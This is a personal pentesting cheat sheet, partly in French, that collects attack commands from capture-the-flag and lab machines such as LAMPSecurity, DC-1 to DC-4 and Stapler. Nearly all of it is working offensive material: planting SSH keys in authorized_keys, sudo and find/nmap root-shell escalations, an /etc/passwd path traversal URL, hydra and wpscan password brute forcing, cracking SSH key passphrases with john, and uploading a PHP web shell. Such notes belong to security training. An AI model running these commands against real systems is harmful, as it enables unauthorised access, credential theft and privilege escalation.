# interesting commands

```
echo LinEnum.sh | base64 |xclip -selection clipboard
grep -R password file_name
grep password . -B1 : get also the element before.
grep passwd /var/log/auth.log : permet de savoir la date de changement des mots de pass

```
if in the target system there is .ssh folder,I can generate my pub,priv key with **keygen -f name** and copy my public key and paste it inside .ssh (authorized_keys) ====>>> then I can connect with my private key: **ssh -i privkey user@targetip**.

```
scp -i privatekey user@targetip:/home/user.txt . : transfert user.txt to my local directory
```
## sudo abusing
```
vi visudo : to open the file listed with sudo -l
if in the file there is: user  ALL=(ALL,!root) ALL
I can run any commande with root priviledge like this: sudo -u#-1 /bin/bash  => BOOM,root access
ALso: user  ALL=(ALL,!abdo) ALL, I can have root access: sudo -u#-1 /bin/bash
bug fixed in 1.8.28  => get your current version $ sudo -V
```
#### LAMPSecurity-4
what I had learn from this machine is:
```
authenticity with private key with ssh : copy my public key to .ssh/authorized_key 
id => cat /etc/group, find / -group grp_name -type f 2>/dev/null
```
#### LAMPSecurity-5
what I had learn from this machine is:
```
smbclient --list //10.0.4.13/ -U "" : list the shared folders
smbclient //10.0.4.13/folder/ -U "" : get in 
grep -Ri password /home/*   : 
searchsploit linux kernel 2.6 : deux chiffre
ls /etc | grep release : know the distribution of the OS
https://10.0.4.13/?page=/../../../etc/passwd%00
hydra -L users -P /usr/share/wordlists/rockyou.txt 10.0.4.13 ssh -V
```
#### DC-1
what I had learn from this machine is:
```
find / -exec /bin/sh \;
```
#### DC-2
what I had learn from this machine is:
```
./wpscan --url http://dc-2/
./wpscan --url http://dc-2/ --enumerate : enumerate users
./wpscan --url http://dc-2/ --usernames file -w wordlist : brute force wp-login.php authenticity
ssh -p- dc-2 : check all ports
ssh -p 7744 tom@dc-2
how to bypass rbash shell : vi,echo os.system('/bin/bash') => https://sushant747.gitbooks.io/total-oscp-guide/escaping_restricted_shell.html
```
this one is soo interesting: https://sushant747.gitbooks.io/total-oscp-guide/vim.html

#### DC-3
what I had learn from this machine is:
```
locate -r .nse$ | grep joomla : look nmap script appropriate to my need
searchsploit linux kernel 4.4 : copier and paste sur google that may have repository in github.
```
#### DC-4
what I had learn from this machine is:
```
requests.post(url).status_code
brute force with burp suite with a wordlist <1000 words
echo "user ALL=(ALL) ALL" | sudo tee /etc/sudoers : tee priviledge escalation
```
#### JIS-CTF01
what I had learn from this machine is:
```
grep -rli 'technawi' --exclude-dir=/proc . 2>/dev/null
```
#### Basic-pentest-2
what I had learn from this machine is:
```
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.0.4.22 
http-get /manager/html -V : brute force tomcat authentofocation.
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.0.4.22:8080/manager/html -V : meme chose que la premiere
HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.0.4.22:8080/manager/html -t 1 -V :  send the request to burp suite

enum4linx 10.0.4.22: list all shared files and groups and user systems
ssh2john id_rsa file.txt :  to retrive the passphrase
john --wordlist=/usr/share/wordlists/rockyou.txt file.txt : return the passphrase
ssh -i id_rsa kay@10.0.4.22
```
S00 interesting article in SMB enumeration: [samba enumeration tool](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)
#### Basic-pentest-2
what I had learn from this machine is:
```
wordpress authentication: I can brute force the username first then the password with hydra, 
the uniq thing that can be changed is error message contained in hydra syntax. : minimize the complexity
./wpscan -u http://10.0.4.23 --enumerate u/tt/..
install file manager in wordpress if you have admin access (it will contain the shell)
nmap --interactive => !sh : root access.
```
#### Stapler 
get in as john user and add a plugin (upload shell.php) 
=> https://10.0.4.32:13780/blogblog/wp-content/uploads: to see the upload file.



